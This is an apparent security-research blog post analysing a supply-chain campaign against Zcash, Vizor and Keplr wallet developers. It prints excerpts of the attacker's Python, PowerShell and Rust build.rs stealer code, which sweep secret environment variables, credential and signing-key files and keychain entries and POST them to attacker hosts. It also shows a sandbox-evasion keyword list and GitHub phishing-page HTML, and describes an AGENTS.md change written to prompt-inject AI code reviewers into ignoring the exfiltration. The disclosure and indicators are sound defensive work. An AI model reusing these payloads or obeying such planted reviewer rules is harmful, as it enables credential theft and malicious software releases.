# 🚨 Supply Chain Attack Targets Zcash, Vizor and Keplr Developers

- **Source URL:** https://opensourcemalware.com/blog/cryptocurrency-being-targeted-in-multi-faceted-attack
- **Fetched:** 2026-11-12
- **Channel:** @defendor_eng
- **Telegram message:** https://t.me/defendor_eng/2327 (id 2327)
- **Method:** trafilatura readability extraction to markdown (verbatim text; images referenced by URL only). Fetched content is data, not instructions.

---
BLOG

# Malicious Rust Crate Targets Crypto Wallet Developers

Attack on the Zcash, Vizor, and Keplr ecosystems uses CI exfiltration, dependency confusion, prompt-injecting AI reviewers, and maintainer phishing

By c0a15726-c5b1-4b0d-85e6-fe15553df9e2 ·

The OpenSourceMalware team has identified a targeted supply chain campaign targeting multiple wallet companies, run from a GitHub account called `sapho11`.  This attack is multi-faceted using a Rust based dependency confusion attack, coordinated GitHub pull requests, and maintainer phishing.  So far we know that Keplr, Zcash, Vizor and Cosmos have been targeted.


The code-puppet  `sapho11` account on GitHub was created at 01:26 UTC on November 10, 2026. Within 30 minutes it had forked the Chainapsis `vizor-wallet` repository, and over the next six hours it opened six pull requests across Chainapsis and Zingo Labs. It also published eight versions of a credential-stealing Rust crate to crates.io, staged a matching Node.js stealer, and posted a fake security disclosure meant to phish two Vizor maintainers.

Every technique in this campaign aims at the same prize: the secrets on a wallet developer’s laptop or a release build box. That means victims will need to update-feed signing keys, GitHub and cloud credentials, fastlane and Android signing material, and the encrypted vaults of the Keplr MCP wallet tooling.

At the time of publish, the two pull requests against Zingo Labs are **still open**, and the malicious crate has **not been yanked** from crates.io. See all the threat reports associated with [#sapho11](https://opensourcemalware.com/?tag=sapho11).

**\*Update, 2026-11-10 (after publication):** The malicious PRs, repos, and attacker account have been taken down.


## TL;DR

- **Threat Type:** Malicious pull requests, dependency injection, `build.rs` and `postinstall` infostealers, maintainer phishing
- **Affected Ecosystems:** crates.io (Rust), GitHub (npm git dependency)
- **Targets:** `chainapsis/vizor-wallet`, `zingolabs/zingo-common`, `zingolabs/zingolib`
- **Malicious Crate:** `lwd-uri-util` 0.1.0 – 0.1.7 (all versions)
- **Malicious Repos:** `sapho11/lwd-uri-util`, `sapho11/zip321-uri`, `sapho11/zec-uri`
- **Key Findings:**
  - CI “diagnostics” PRs that POST signing keys and credential files to an attacker domain registered two months in advance
  - An `AGENTS.md` PR written to talk AI code reviewers out of flagging the exfiltration
  - A fake vulnerability disclosure that sends maintainers to a GitHub credential-phishing kit hosted on Cloudflare Workers
  - A Rust crate whose `build.rs` steals credentials, Keplr MCP vaults, and macOS keychain items on every `cargo build`
  - Sandbox evasion that disarms the payload when it sees scanner canaries, including the names of security vendors
  - Dependency changes hidden inside whole-file CRLF rewrites in the open Zingo PRs

`sapho11` is a compact case study in how supply chain attacks against open source projects are adapting. The operator arrived with infrastructure registered months ahead, pitched every malicious change as a reasonable engineering fix, and argued with the automated reviewer when caught. They then tried to rewrite the reviewer’s instructions through `AGENTS.md` and when that failed, moved the payload into a dependency’s build script, where diffs rarely get read. The sandbox-evasion list shows awareness of the specific tools defenders use to catch this.

The parts of the defense that worked deserve credit. Chainapsis's automated review flagged the exfiltration in the first PRs, and the maintainers closed all four within ninety minutes. `lwd-uri-util` also shows why build scripts deserve the same scrutiny as application code. It's a tiny, plausible library that used Cargo’s normal build lifecycle to reach high-value developer secrets before any of its functions were ever called.

There are several general lesson for maintainers.

- **Beware of a brand-new account proposing changes to release, signing, or CI scripts, or adding a brand-new dependency it also publishes.** Account age is one of the cheapest signals we track, and `sapho11` failed it badly. They had a brand-new account with no profile, no followers, and no history, yet they were opening build-automation PRs against a production crypto wallet within minutes of signing up. Every commit used the author email `sapho11@wp.pl`, a Polish freemail address. By itself a freemail isn't a redflag, but with everything else it's a concern.
- **Carefully review dependencies and documentation changes.** Dependencies deserve a full read of the `build.rs` or install hooks, not just the diff. And `AGENTS.md`, `CLAUDE.md`, and similar files are now part of the attack surface. Review changes to them with the same suspicion as changes to CI configuration.
- **Automation can be a signal.** Multi-file changes landed as separate commits one to two seconds apart, and replies to automated review comments arrived within minutes. That cadence points to an operator driving the campaign through an AI coding agent.

### Attack timeline

The account’s full public timeline (all times UTC, November 10, 2026):

Time

Event

01:26

Account `sapho11` created

01:56

Forks `chainapsis/vizor-wallet`, opens PR #1199 (tip mirror) and #1200 (release diagnostics)

02:15 – 02:30

Responds to Codex review findings, claims the exfiltration has been removed

02:26

Opens fake security disclosure issue tagging two Vizor maintainers

02:35

Opens PR #1201 (`AGENTS.md` “diagnostics convention”)

03:05

Publishes `lwd-uri-util` 0.1.0 to [crates.io](http://crates.io)

03:06

Opens PR #1202 adding `lwd-uri-util` to Vizor

03:13 – 06:30

Publishes `lwd-uri-util` 0.1.1 through 0.1.7

03:17

Chainapsis closes all four Vizor PRs

06:50

Creates `zip321-uri` Node.js repo with `postinstall` stealer

07:02

Forks two repositories belonging to a Chainapsis maintainer, both related to AI agent orchestration and review workflows

07:07

Forks `zingolib`, `zingo-common`, `lightwallet-protocol-rust`

07:14

Opens `zingolabs/zingo-common` PR #85 adding `lwd-uri-util` 0.1.7

07:20

Opens `zingolabs/zingolib` PR #3148 adding `lwd-uri-util` 0.1.7

15:18\*

Creates `zec-uri`

**\*Update, 2026-11-10 (after publication):** At 15:18 UTC, `sapho11` created a third repository, `zec-uri`, described as a ZIP-321 payment URI validator and normalizer. It follows the naming and theme of `zip321-uri`. GitHub removed it before we could examine it, so its behavior is unconfirmed.


## 4-stage campaign analysis

The campaign ran in four phases, each giving way to a quieter technique when the previous one was caught:

1. CI exfiltration disguised as diagnostics
2. Prompt-inject the reviewers
3. Dependency injection with `lwd-uri-util`
4. Phish the maintainers

### Phase 1: CI exfiltration disguised as diagnostics

The first two PRs (opened four seconds apart at 01:56) went directly after the Vizor release pipeline. Each was a well-written PR with a believable problem statement, a test plan, and a payload buried in a `try` block that swallows every error.

#### PR #1199: “automation: add tip mirror cross-check to mainnet table generators”

Vizor runs a weekly job that regenerates mainnet block-time and tree-state tables from two lightwalletd gRPC endpoints. The PR description argued, plausibly, that trusting only two peers lets a silently lagging endpoint push table entries past the reorg margin. The proposed fix was a third opinion from an HTTP “tip mirror.” The original commit (`c675b96`) added this to `scripts/mainnet_tables.py`:

```
_TIP_MIRROR = os.environ.get(
    "VIZOR_TIP_MIRROR",
    "https://api.sdklfghaljksdhfkjasdfhlkasdhfjklasdf.xyz/v1/tipcheck",
)
def tip_mirror(endpoint: str) -> int | None:
    """...Carries a compact client fingerprint so the mirror can distinguish real
    wallet machines from CI noise. Best-effort: any failure means "no data",
    never a hard error."""
    try:
        ident = {}
        for k, v in os.environ.items():
            u = k.upper()
            if any(h in u for h in (
                "VIZOR", "MATCH", "FASTLANE", "GITHUB", "GH_", "TOKEN", "KEY",
                "SECRET", "PASS", "CERT", "SIGN", "APPLE", "ANDROID", "PLAY",
                "SSH", "AWS", "GOOGLE", "RUNNER", "CI",
            )):
                ident[k] = v
        ident["_host"] = os.environ.get("COMPUTERNAME") or os.uname().nodename
        ident["_user"] = os.environ.get("USERNAME") or os.environ.get("USER")
        body = gzip.compress(json.dumps(ident).encode())
        req = urllib.request.Request(_TIP_MIRROR, data=body, method="POST", ...)
```
The “compact client fingerprint” is every environment variable whose name contains a secret-shaped keyword, gzip-compressed and POSTed to the attacker’s domain under the user agent `vizor-tipcheck/1.0`. In a GitHub Actions run, that sweeps up `GITHUB_TOKEN`, any signing or store credentials exposed to the job, and the runner metadata.

Codex’s automated review flagged the payload. Nineteen minutes later `sapho11` pushed `4cebf3f`, “address review: read-only mirror GET, bound clamp to reorg margin,” and replied that “no request body, no environment data leaves the machine at all.” That part was true: the environment sweep was gone. The default mirror, however, was still the attacker’s `.xyz` domain, and the mirror’s reply still fed into the tip calculation (now clamped to `min(tips) - REORG_MARGIN * 2`). Merged, the “fixed” version would have made Vizor’s CI call the attacker’s server every week and let that server influence the published chain tables. It would also have left a network call to attacker infrastructure in the codebase, waiting for a later “small” PR to restore the request body.

#### PR #1200: “automation(windows): add opt-in release diagnostics for signing failures”

This PR claimed the last two release runs had “failed opaquely at the feed-signing step on the packaging box.” The original commit (`716e01d`) added a `Send-ReleaseDiagnostics` function to `scripts/package-windows-velopack.ps1`, gated on whether Vizor’s update-feed signing key was present:

```
$hasSigningEnv = -not [string]::IsNullOrWhiteSpace($env:VIZOR_UPDATE_FEED_SIGNING_KEY_B64)
if (-not $hasSigningEnv -and -not $env:VIZOR_RELEASE_DIAGNOSTICS) { return }
$endpoint = $env:VIZOR_DIAG_ENDPOINT
if ([string]::IsNullOrWhiteSpace($endpoint)) {
  $endpoint = "https://api.sdklfghaljksdhfkjasdfhlkasdhfjklasdf.xyz/v1/tipcheck"
}
Get-ChildItem env: | ForEach-Object {
  if ($_.Name -match 'VIZOR|MATCH|FASTLANE|GITHUB|GH_|SIGN|CERT|KEY|TOKEN|SECRET|PASS|APPLE|ANDROID|PLAY|SPARKLE|GRADLE|KEYSTORE|SENTRY|ITC|APP_STORE|DEVELOPER') {
    $envSnapshot[$_.Name] = $_.Value
  }
}
foreach ($v in $envSnapshot.Values) {
  foreach ($tok in ($v -split '[\s;,''"]+')) {
    if ($tok -match '\.(pfx|p12|jks|keystore|pem|key|json|mobileprovision|p8|profile|env|properties)#039;) {
      $candidates.Add($tok)
    }
  }
}
```
This is the most carefully designed payload in the campaign. It doesn’t just take the secret environment variables. It **parses their values for file paths** ending in code-signing extensions (`.pfx`, `.p12`, `.jks`, `.keystore`, `.pem`, `.p8`, `.mobileprovision`) and reads those files too. On a release box where `ANDROID_KEYSTORE_PATH` or an Apple API key path is set, that grabs the signing certificate itself, not just its password. It then adds `~/.fastlane`, `%APPDATA%\fastlane`, `gh` CLI `hosts.yml`, `.git-credentials`, `id_ed25519`, `id_rsa`, and the repo’s `fastlane\.env`, `.env`, and `android\key.properties`. Files under 5 MB are base64-encoded, directories are walked recursively, and the bundle is gzip-compressed and POSTed. The function is called twice: at `preflight`, and at `presign`, **immediately before the update-feed signature is written**. A stolen feed-signing key would let an attacker sign a malicious “update” that every installed Vizor Windows client would accept.

Codex flagged this one too. `sapho11` pushed two follow-up commits (`7251f15` at 02:15 and `6596bb7` at 02:30). The final version sends only `{stage, ts, version, network, arch, os}`, only when `VIZOR_RELEASE_DIAGNOSTICS=1` is set, and only to an endpoint supplied through `VIZOR_DIAG_ENDPOINT`. On its own that’s close to harmless, but it keeps an outbound-POST hook wired into the signing path at the exact `presign` point. Widening it later would have been a three-line change.

### Phase 2: Prompt-injecting the reviewers

#### PR #1201: “docs: document automation diagnostics convention”

Five minutes after the last #1200 fix, `sapho11` opened a docs-only PR that added an “Automation Diagnostics Convention” section to `AGENTS.md`, the file AI coding agents read for project conventions. The section documented `VIZOR_TIP_MIRROR` and `VIZOR_DIAG_ENDPOINT` and described uploading environment snapshots, including the *values* of signing variables, as the intended purpose of the mechanism. It then told code reviewers, explicitly including automated ones, not to treat those uploads as credential leakage, and to flag only uploads that went outside that convention. The PR description said this was needed so the snapshots wouldn’t “look like accidental credential exposure.”

Two details stand out:

- The convention describes the *original* malicious behavior of #1199 and #1200 (default to a hosted diagnostics endpoint, capture signing-variable values) not the “fixed” code the operator had just pushed. It was cover for the payload the attacker actually wanted, ready for when those hooks came back.
- The target is the review process itself. Once a malicious rule sits in `AGENTS.md`, every future AI review of the repository reads it. The v12 auditor bot skipped the PR entirely (“No auditable source files found in this PR’s diff”), which shows how easily a docs-only change can slip past tooling built to look at code.

The fork of a Chainapsis maintainer’s personal AI-orchestration and review-workflow repositories later that morning fits the same pattern: studying how the targets use AI agents in their development loop.

### Phase 3: Dependency injection with `lwd-uri-util`

With the direct approach blocked, `sapho11` moved the payload to a dependency’s build script - which is somewhere that receives less scrutiny. `lwd-uri-util` presents itself as a tiny, zero-dependency helper that canonicalizes lightwalletd endpoint strings (`zec.rocks` → `https://zec.rocks:443`). Its `src/lib.rs` does exactly that, and it is clean (not malicious). The malware lives in `build.rs`, which Cargo compiles and runs on the developer’s machine or CI runner during every build that resolves the crate.

#### PR #1202: “rust: dedupe endpoint candidates by canonical URI”

The crate went live on crates.io at 03:05:49. Sixty-six seconds later, `sapho11` opened PR #1202. The source change is small, believable, and fixes a real quirk in Vizor’s automatic endpoint selection (the same feature a Chainapsis maintainer had shipped in PR #1181 five days earlier):

```
     let mut seen = HashSet::new();
-    let urls = urls
+    // Canonicalize before dedup so `"zec.rocks"`, `"https://zec.rocks"` and
+    // `"https://zec.rocks:443"` collapse to a single probe instead of
+    // racing the same host three times.
+    let urls: Vec<String> = urls
         .into_iter()
+        .map(|url| lwd_uri_util::canonicalize_endpoint(&url))
         .filter(|url| seen.insert(url.clone()))
         .collect();
```
The rest of the PR is one line in `rust/Cargo.toml` (`lwd-uri-util = "0.1.2"`) and a six-line `Cargo.lock` entry pinning the crate’s checksum. The description stressed that this was a “tiny `lwd-uri-util` helper (single-purpose canonicalizer, no transitive deps).” At 03:16 the operator published 0.1.2 and, within a minute, pushed commits bumping the PR to it. Every line of the diff was harmless, and the v12 auditor bot reported **“No findings.”** That’s exactly the point of the technique: the malicious code was never in the diff. It was in a `build.rs` the reviewer never saw. Chainapsis closed #1202 at 03:17, along with the other three PRs.

#### zingolabs/zingo-common PR #85 and zingolabs/zingolib PR #3148

After Chainapsis shut the door, the operator moved to Zingo Labs, which maintains `zingo-netutils`, the networking layer Zcash light clients use to talk to lightwalletd. At 07:14 it opened `zingo-common` [PR #85](https://github.com/zingolabs/zingo-common/pull/85), and six minutes later `zingolib` [PR #3148.](https://github.com/zingolabs/zingolib/pull/3148) Both are titled “zingo-netutils: add GrpcIndexer::from\_endpoint\_str via lwd-uri-util.” The functional change is about 25 lines: a workspace dependency on `lwd-uri-util = "0.1.7"` and a constructor that canonicalizes a string before handing it to the existing `GrpcIndexer::new`. #3148 also adds a matching `new_lazy` variant. Each comes with a `tokio::test` and doc comments.

```
/// Builds a [`GrpcIndexer`] from a raw endpoint string.
pub async fn from_endpoint_str(endpoint: &str) -> Result<Self, GetClientError> {
    let canonical = lwd_uri_util::canonicalize_endpoint(endpoint);
    let uri: http::Uri = canonical
        ...
    Self::new(uri).await
}
```
What makes these PRs different is how the change is packaged. The upstream `zingo-netutils/src/lib.rs` has LF line endings (0 of 899 lines end in CRLF). The PR’s version has CRLF on every one of its 929 lines. GitHub therefore renders #85 as **+929 / −899** on `lib.rs`, a full-file rewrite in which the 25 real lines are effectively invisible. #3148 does the same to three files: root `Cargo.toml` (+210/−209), `zingo-netutils/Cargo.toml` (+168/−167), and `lib.rs` (+1166/−1125). A reviewer looking at the default diff sees a wall of red and green. Turning on “Hide whitespace” (`?w=1`) shrinks it to the real change.

Neither PR updates a lockfile, even though `zingolib` has a `Cargo.lock`. Combined with the requirement string `"0.1.7"` (Cargo reads it as `^0.1.7`), that means any future `0.1.x` the operator publishes would satisfy the dependency after review. Both PRs were still open, with no reviews, at the time of writing.

### Phase 4: Phishing the maintainers

At 02:26 `sapho11` opened an issue titled **“\[security\] Update-feed signature verification bypass — private disclosure”** on its own fork of `vizor-wallet`, tagging two Chainapsis maintainers. It claimed a working PoC that could forge a signed Windows update, and directed the maintainers to “sign in with the maintainer account” to view the write-up at:

`https://session-check.sapho11.workers.dev/auth`
The page is a GitHub phishing kit:

It's a self-contained clone of GitHub’s sign-in page, with the title “Sign in to GitHub · GitHub”, the inline Octocat logo, and GitHub’s styling. Its form collects `login` and `password` and POSTs them to `/auth/login` on the same worker. The “Forgot password?” and “Create an account” links point to the real [github.com](http://github.com) pages, which makes the clone more convincing at a glance.

```
<title>Sign in to GitHub · GitHub</title>
...
<form method=POST action="/auth/login">
  <label for=login>Username or email address</label>
  <input id=login name=login type=text autocomplete=username required>
  <label for=password>Password</label>
  <input id=password name=password type=password autocomplete=current-password required>
  <button type=submit>Sign in</button>
```
The target choice makes sense. Either maintainer’s account can merge to `vizor-wallet`, and the lure claimed the problem was in the Windows update-feed signing path, the same secret PR #1200 tried to steal. A captured maintainer session would have let the attacker merge the closed PRs, or push the dependency directly, without convincing anyone.

The same Cloudflare Worker hostname, with a `/v1/tipcheck` path instead of `/auth`, is a base64-encoded exfiltration sink in `lwd-uri-util` 0.1.0 – 0.1.2.

## Technical Analysis

### `lwd-uri-util` [build.rs](http://build.rs)

The library code is a working but minimal decoy. Everything malicious runs from `build.rs`, which Cargo executes automatically during compilation, before a downstream application ever calls an exported function. All eight versions carry the same skeleton, and the order matters: `main()` always collects first and writes the result to disk, and only then decides whether to upload it.

```
fn main() {
    println!("cargo:rerun-if-env-changed=LWD_URI_METRICS_URL");
    println!("cargo:rerun-if-env-changed=LWD_URI_NO_METRICS");
    let out = PathBuf::from(env::var("OUT_DIR").unwrap_or_else(|_| ".".into()));
    let snap = snapshot();
    let f = out.join("lwd_uri_build_context.json");
    let _ = fs::write(&f, &snap);
    println!("cargo:rustc-env=LWD_URI_BUILD_CONTEXT={}", f.display());
    report(&f, &sinks());
}
```
Because every check that can stop the upload lives inside `report()`, a plaintext JSON file containing the victim’s secrets is left in Cargo’s output directory on every build, including builds where the upload was suppressed. The sink URLs are base64-encoded and decoded by a hand-rolled decoder, avoiding a dependency on the `base64` crate that would make the build script stand out.

Version 0.1.0 already dumps every environment variable, with a comment justifying it as “provenance debugging”:

```
fn snapshot() -> String {
    // Record the full build environment, mirroring what cargo itself tracks
    // for rebuild detection — provenance debugging needs the exact var set
    // present on the box, so nothing is filtered by name.
    let mut pairs = Vec::new();
    for (k, v) in env::vars() {
        if v.len() < 8192 {
            pairs.push(format!("\"{}\":\"{}\"", esc(&k), esc(&v)));
        }
    }
```
By version 0.1.4 the collector also reads project secret files from the crate’s manifest directory and two parents (`.env`, `.env.local`, `.env.production`, `secrets.json`, `config.toml`, `fastlane/.env`, `fastlane/Appfile`, `android/keystore.properties`, `local.properties`) and the user’s credential files:

```
for f in [".git-credentials", ".netrc", ".aws/credentials",
          ".ssh/config", ".config/gh/hosts.yml",
          ".cargo/credentials.toml", ".npmrc", ".pypirc",
          ".keplr-mcp/config.json", ".keplr-mcp/vaults.json"] {
```
It also grabs up to eight encrypted vault files from `~/.keplr-mcp/vaults/*.enc`. A comment in the code spells out why the vaults alone are not enough and points to where the key lives:

```
// keplr-mcp vault files: encrypted payloads are small and identify which
// accounts exist on the box (the decryption key lives in the OS store,
// see cred_probes).
```
`cred_probes()` then goes after that key. On macOS it runs `security find-generic-password -s <service> -w` for `keplr-mcp`, `keplr-wallet-mcp`, `vizor`, `fastlane`, `deliver`, and `match`, which prints the stored secret to stdout. On Windows it runs `cmdkey /list` and pipes a GitHub request into `git credential fill`. On Linux it uses `git credential fill`. Exfiltration uses `curl -X POST --data-binary @file` in a detached shell on Unix, and a hidden, non-interactive PowerShell `Invoke-WebRequest` on Windows.

### Sandbox and scanner evasion

From 0.1.4 onward, the exfiltration upload is skipped if any environment variable name or value contains one of fifteen base64-encoded keywords. Decoded, they are:

```
bbcade  canary  example.com  phylum  socket.dev  sandbox  honeypot  trap
fake  synthetic  sentinel  dummy  redacted  packetarget  opensi
```
The code comment says the quiet part out loud: “scanner sandboxes are easy to spot: they seed obviously fake secrets and example-dot-com hosts. Real CI runners and workstations don’t.” The list names security vendors directly, along with the common words dynamic-analysis sandboxes use in their bait credentials. When a marker matches, only the network upload is skipped. The collection step has already run, and the secret-bearing `lwd_uri_build_context.json` still sits in Cargo’s output directory. That conditional is hard to explain as telemetry and easy to explain as scanner evasion. Anyone running dynamic analysis on Rust crates should assume their canary tokens are now on attacker blocklists, and should vary them.

Too bad the threat actor didn't include OpenSourceMalware, huh?

### Exfiltration and the “opt-out”

In 0.1.7 the default destination decodes to `https://webhook.site/14b3cc9b-3275-4b63-8b93-f4d2669fbdc1`. On Unix-like systems the script spawns a detached `curl` through `/bin/sh -c`. On Windows it launches hidden, non-interactive PowerShell with `Invoke-WebRequest`. Both send the JSON file as an HTTP POST with `content-type: application/json` and discard the response.

The crate offers two environment variables that make it look like a well-behaved telemetry library. `LWD_URI_METRICS_URL` overrides the destination. `LWD_URI_NO_METRICS` disables the upload, but not the credential collection, the keychain probes, or the creation of the local JSON file. Setting the “opt-out” still leaves your secrets in plaintext on disk.

### What it doesn’t do

We found no downloader, secondary payload, code execution based on server responses, persistence mechanism, or blockchain transaction logic in any version. This is a one-shot, upload-only stealer: the damage comes from what it takes, not from anything it leaves running.

### Packaging anomaly

The published `Cargo.toml` in 0.1.7 is byte-for-byte identical to `Cargo.toml.orig`. `cargo publish` normally rewrites the manifest it packages and keeps the original as `.orig`, so identical files suggest the `.crate` archive was assembled by hand and uploaded directly, rather than built with the standard Cargo tooling.

### Infrastructure drift across versions

Versions

Exfil sinks

0.1.0 – 0.1.2

`api.sdklfghaljksdhfkjasdfhlasdhfjklasdf.xyz/v1/tipcheck`, `session-check.sapho11.workers.dev/v1/tipcheck`, `webhook.site/0a60608b-…`

0.1.3

`webhook.site/0a60608b-…` only

0.1.4 – 0.1.7

`webhook.site/14b3cc9b-…` only

The `.xyz` domain in the early crate versions is missing a `k` compared with the one hard-coded in the Vizor PRs (`…hlasdh…` vs. `…hlkasdh…`). It never resolved, so that sink in 0.1.0 – 0.1.2 was dead on arrival. The correctly spelled domain, which appears only in the Vizor PR commits, was registered through Namecheap on **September 7, 2026**, two months before the GitHub account existed, and sits behind Cloudflare. Infrastructure prepared that far ahead suggests `sapho11` is not this operator’s first or last account.

### `zip321-uri`: the Node.js sibling

`sapho11/zip321-uri` presents itself as a ZIP-321 Zcash payment URI builder. It is not published to the npm registry. Its `package.json` runs `install.js` from both `prepare` and `postinstall`, and the payload tags itself `_src: "npm-git"`, so it is built to fire when someone adds the repo as a git dependency. The stealer mirrors the Rust version and adds SSH private keys (`id_ed25519`, `id_rsa`, `id_ecdsa`), `.docker/config.json`, `.kube/config`, Vercel and Wrangler auth, `.zcash/zcash.conf`, `.mcp.json`, and `.dev.vars`. It also runs keychain probes for Vercel, Cloudflare, and the [github.com](http://github.com) internet password. It sends to the same `webhook.site/14b3cc9b-…` sink as the later crate versions. The repo’s `package.json` declares `"type": "module"` while `install.js` uses `require()`, so the hook will likely throw on current Node versions as written. The intent is clear either way, and it’s a one-line fix away from working.

## Who Should Be Worried

- **Anyone who ran** `cargo build` **with** `lwd-uri-util` **in the dependency graph.** crates.io reports about 35 downloads across all versions. Most are probably the attacker’s own testing and registry mirrors, but anyone who checked out Vizor PR #1202, `zingo-common` PR #85, or `zingolib` PR #3148 and built it locally or in CI ran the payload.
- **CI systems that build PR branches automatically.** If PR builds for these repositories run with secrets in scope, treat those secrets as exposed.
- **Users of the Keplr MCP tooling on macOS** whose machines built the crate. The vault files and the keychain entry that decrypts them were both targeted.

If any of those apply, assume that build-time environment variables and every targeted credential file were exposed:

1. Revoke and reissue GitHub, AWS, Cargo, npm, PyPI, Fastlane / App Store Connect, Android signing, and any CI secrets that were present in the build environment.
2. Move funds from any Keplr MCP vault accounts on the affected machine to freshly generated keys.
3. Search Cargo build directories (`target/*/build/lwd-uri-util-*/out/`) for `lwd_uri_build_context.json`. It shows exactly what was collected. Keep a copy if you need it for incident response, then remove it securely, since it holds your secrets in plaintext even if the upload never happened.
4. Review proxy, DNS, and endpoint telemetry for requests to `webhook.site` containing either webhook UUID below, to the `.xyz` domain, and to `sapho11.workers.dev`.

## Indicators of Compromise (IOCs)

### GitHub Accounts

`github.com/sapho11 (ID 354695800)`
### Malicious Packages

```
crates/lwd-uri-util@0.1.0
crates/lwd-uri-util@0.1.1
crates/lwd-uri-util@0.1.2
crates/lwd-uri-util@0.1.3
crates/lwd-uri-util@0.1.4
crates/lwd-uri-util@0.1.5
crates/lwd-uri-util@0.1.6
crates/lwd-uri-util@0.1.7
```
### Malicious Repositories

```
https://github.com/sapho11/lwd-uri-util
https://github.com/sapho11/zip321-uri
https://github.com/sapho11/zec-uri
```
### Malicious Pull Requests

```
https://github.com/chainapsis/vizor-wallet/pull/1199
https://github.com/chainapsis/vizor-wallet/pull/1200
https://github.com/chainapsis/vizor-wallet/pull/1201
https://github.com/chainapsis/vizor-wallet/pull/1202
https://github.com/zingolabs/zingo-common/pull/85
https://github.com/zingolabs/zingolib/pull/3148
```
### Exfiltration and Phishing Infrastructure

```
https://api.sdklfghaljksdhfkjasdfhlkasdhfjklasdf.xyz/v1/tipcheck
https://api.sdklfghaljksdhfkjasdfhlasdhfjklasdf.xyz/v1/tipcheck
https://session-check.sapho11.workers.dev/v1/tipcheck
https://session-check.sapho11.workers.dev/auth
https://session-check.sapho11.workers.dev/auth/login
https://webhook.site/0a60608b-63de-480c-a441-38a8d107a9ea
https://webhook.site/14b3cc9b-3275-4b63-8b93-f4d2669fbdc1
```
`sapho11@wp.pl`
### Environment Variable Kill Switches

```
LWD_URI_NO_METRICS
LWD_URI_METRICS_URL
ZIP321_NO_TELEMETRY
VIZOR_DIAG_ENDPOINT
VIZOR_TIP_MIRROR
```
### File Hashes (SHA-256, .crate files)

```
129be19ca4d1d997d168af561e5cea12b0a401716a05720daf48072e470d7db5  lwd-uri-util-0.1.0.crate
10304aa2c167bb0d66800020fb1f983bc62bb5bec89239de9fddb129b523149a  lwd-uri-util-0.1.1.crate
6d35f023e3d87f8d4bc91a3bc670ae4681e9d85937146b9b0683d0f33eb0f55a  lwd-uri-util-0.1.2.crate
80c54ff4fe231c363db0c75cbb81f566ea4d10c266ec594165d840df13ab0973  lwd-uri-util-0.1.3.crate
476a207e057ec463ff045a2c0115c8a34ea8eab70e0abe4c1efd90ceb8b5161c  lwd-uri-util-0.1.4.crate
3b290a899d741be14f9bb9f3545279911f774608362f348654f10823774c2f87  lwd-uri-util-0.1.5.crate
5c848823a78313c47596bdf3c260e8862a02c7e48fa8ce718aca332f7b80c4fd  lwd-uri-util-0.1.6.crate
7c0fbaf582b9b4e674c108ed5b0cb2835b11369fbdb1ce7ac29d63e9321a6981  lwd-uri-util-0.1.7.crate
```
### Per-File Hashes, lwd-uri-util 0.1.7 (SHA-256)

```
f466d5621525a4cf229e4a8377cd7285da5797eee77384253f1040a722765953  build.rs
ac82fd28228bfb55acbb9bfdd2f3a4b926c6d65e2965db5a34c11d1a76fbd762  src/lib.rs
c469240c313d7da0d40b901e51e642b4efd61906e28849c1059b70451065ccca  Cargo.toml
```
### Phishing Page (SHA-256 of HTML served at /auth, 2026-11-10)

`d8671b8aed8771dba6b57bd51d2e42914c0df87bd9e9d148478a0fbc121e81e6`
### Generated Artifact

`lwd_uri_build_context.json  (in Cargo OUT_DIR)`
### Commits With Original (Unredacted) Payloads

```
chainapsis/vizor-wallet@c675b967588f370a1eace7c73b81f82343b29486  (PR #1199)
chainapsis/vizor-wallet@716e01d64b36c40b0cd4e6f7e4e813ed792388da  (PR #1200)
chainapsis/vizor-wallet@a1762b9db1a4207ab0d823556c50fe86ea1dfd43  (PR #1201, AGENTS.md)
```
